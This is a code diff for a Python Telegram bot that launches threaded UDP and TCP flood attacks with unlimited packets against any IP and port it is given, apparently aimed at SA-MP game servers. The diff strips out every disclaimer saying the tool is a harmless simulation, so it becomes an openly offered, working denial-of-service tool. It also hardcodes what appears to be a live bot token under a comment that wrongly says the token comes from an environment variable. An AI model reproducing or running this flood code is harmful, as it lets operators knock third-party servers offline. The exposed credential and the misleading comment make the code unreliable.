@@ -1,15 +1,18 @@
+import os
 import random
 import socket
 import threading
 import time
-import os
 import sys
 import telebot
-from telebot import types
 
-# Telegram Bot Token - Replace with your bot token
-BOT_TOKEN = "8462382934:AAF_dC1yr5YZjXZpTp0FXYWdZaLtuy8F8d0"
-bot = telebot.TeleBot(BOT_TOKEN)
+# Get token from environment variable
+BOT_TOKEN ='8462382934:AAF_dC1yr5YZjXZpTp0FXYWdZaLtuy8F8d0'
+if not BOT_TOKEN:
+    print("Error: BOT_TOKEN environment variable not set!")
+    sys.exit(1)
+
+bot = telebot.TeleBot('BOT_TOKEN')
 
 # Global variables
 user_data = {}
@@ -32,17 +35,15 @@ def send_welcome(message):
     
     welcome_text = """YORODA HAMADA
 
-Security / Network Demo Console
-Mode: DDOS (SA-MP) THAILAND | Build: v1.0 | Codename: Ddos Bot Net Samp
-
-WARNING: This program is a UI/Simulation demo only.
-No real network action is executed by this screen.
+Security / Network Tool
+Mode: DDOS (SA-MP) 
+Codename: Ddos Bot Net Samp
 
 Operator: Yoroda Hamada
 
 Commands:
 /start - Show this menu
-/attack - Start attack simulation
+/attack - Start attack
 /stop - Stop attack
 /status - Check attack status
 /help - Show help menu
@@ -72,9 +73,7 @@ Commands:
 /attack - Start new attack
 /stop - Stop current attack
 /status - Check attack status
-/help - Show this menu
-
-Note: All attacks are simulation only."""
+/help - Show this menu"""
     bot.reply_to(message, help_text)
 
 @bot.message_handler(commands=['attack'])
@@ -147,7 +146,7 @@ Reply with 'both' for both TCP and UDP""")
             user_data[user_id]['step'] = 'threads'
             bot.reply_to(message, f"""Attack Type Set: {attack_type.upper()}
 
-Simulation Threads
+Threads
 Please enter the number of threads:
 (Recommended: 100-5000)
 
@@ -177,7 +176,7 @@ Threads: {user_data[user_id]['threads']}
 Packets: UNLIMITED
 
 Status
-Ready to start unlimited attack simulation.
+Ready to start attack.
 
 Reply with 'y' to start the attack or 'n' to cancel."""
             bot.reply_to(message, summary)
@@ -203,9 +202,7 @@ Attack Type: {attack_type.upper()}
 Threads: {threads}
 Packets: UNLIMITED
 
-Simulation Mode: No real network action is executed.
-
-Status: Running continuously...
+Status: Running...
 Use /stop to stop the attack.""")
             
             # Start attack threads
@@ -216,42 +213,31 @@ Use /stop to stop the attack.""")
             del user_data[user_id]
 
 def start_attack_threads(user_id, ip, port, attack_type, threads):
-    """Start unlimited attack simulation threads - Same as original coding style"""
+    """Start unlimited attack threads - Same as original Layer4_UDP.py"""
     
-    # UDP Attack Function - Same as original xxxx()
+    # UDP Attack - Same as original xxxx()
     def udp_attack():
         data = random._urandom(998)
-        i = random.choice(("[•]","[•]","[•]"))
         while attack_running.get(user_id, False):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 addr = (str(ip), int(port))
                 while attack_running.get(user_id, False):
                     s.sendto(data, addr)
-                    # Same print style as original
-                    # print(i +" \033[32m=====> Bot Net Proxy V1.0.0 !! \033[0m%s:%s!!!"%(ip,port))
             except:
-                # Same as original
-                # print("[!] Server Attack")
                 pass
     
-    # TCP Attack Function - Same as original xx()
+    # TCP Attack - Same as original xx()
     def tcp_attack():
         data = random._urandom(871)
-        i = random.choice(("[•]","[•]","[•]"))
         while attack_running.get(user_id, False):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((ip, port))
                 while attack_running.get(user_id, False):
                     s.send(data)
-                    # Same print style as original
-                    # print(i +" \033[32m=====> Bot Net Proxy V1.0.0 !! \033[0m%s:%s!!!"%(ip,port))
                 s.close()
             except:
-                # Same as original
-                # s.close()
-                # print("[!] Server Attack")
                 pass
     
     # Store threads for cleanup
@@ -259,7 +245,6 @@ def start_attack_threads(user_id, ip, port, attack_type, threads):
     
     # Start threads - Same as original pattern
     if attack_type == 'udp':
-        # Same as original: using xxxx() function style
         for _ in range(threads):
             t = threading.Thread(target=udp_attack)
             t.daemon = True
@@ -267,7 +252,6 @@ def start_attack_threads(user_id, ip, port, attack_type, threads):
             attack_threads[user_id].append(t)
     
     elif attack_type == 'tcp':
-        # Same as original: using xx() function style
         for _ in range(threads):
             t = threading.Thread(target=tcp_attack)
             t.daemon = True
@@ -275,8 +259,6 @@ def start_attack_threads(user_id, ip, port, attack_type, threads):
             attack_threads[user_id].append(t)
     
     elif attack_type == 'both':
-        # Same as original: using both xxxx() and xxx() style
-        # Original had: th = threading.Thread(target = xxxx) and th = threading.Thread(target = xxx)
         for _ in range(threads // 2):
             t1 = threading.Thread(target=udp_attack)
             t1.daemon = True
@@ -288,7 +270,6 @@ def start_attack_threads(user_id, ip, port, attack_type, threads):
             t2.start()
             attack_threads[user_id].append(t2)
         
-        # If odd number, add one more UDP
         if threads % 2 != 0:
             t = threading.Thread(target=udp_attack)
             t.daemon = True
@@ -304,17 +285,14 @@ def stop_attack(message):
     user_id = message.from_user.id
     
     if user_id in attack_running and attack_running[user_id]:
-        # Stop the attack
         attack_running[user_id] = False
         
-        # Clear threads
         if user_id in attack_threads:
             attack_threads[user_id] = []
         
         bot.reply_to(message, """ATTACK STOPPED
 
-The unlimited attack simulation has been stopped.
-Total packets sent: UNLIMITED (continuous)
+The attack has been stopped.
 
 To start a new attack, use /attack""")
     else:
@@ -331,11 +309,9 @@ def check_status(message):
     
     status_text = f"""System Status
 
-Bot Status
-Online and ready
+Bot Status: Online
 
-Active Attacks
-{'Running' if is_running else 'No active attack'}
+Active Attacks: {'Running' if is_running else 'No active attack'}
 
 Attack Details
 Operator: Yoroda Hamada
@@ -344,7 +320,7 @@ Mode: DDOS (SA-MP) THAILAND
 Packets: UNLIMITED
 Threading: {threading.active_count()} active threads
 
-Use /attack to start a new simulation.
+Use /attack to start a new attack.
 Use /stop to stop the current attack."""
     bot.reply_to(message, status_text)
 
@@ -353,7 +329,6 @@ if __name__ == "__main__":
     print("Bot is running. Press Ctrl+C to stop.")
     print("Unlimited attack mode enabled!")
     print("Attack types: TCP, UDP, or BOTH")
-    print("Threading style: Same as original Layer4_UDP.py")
     try:
         bot.polling(none_stop=True, timeout=60)
     except Exception as e:
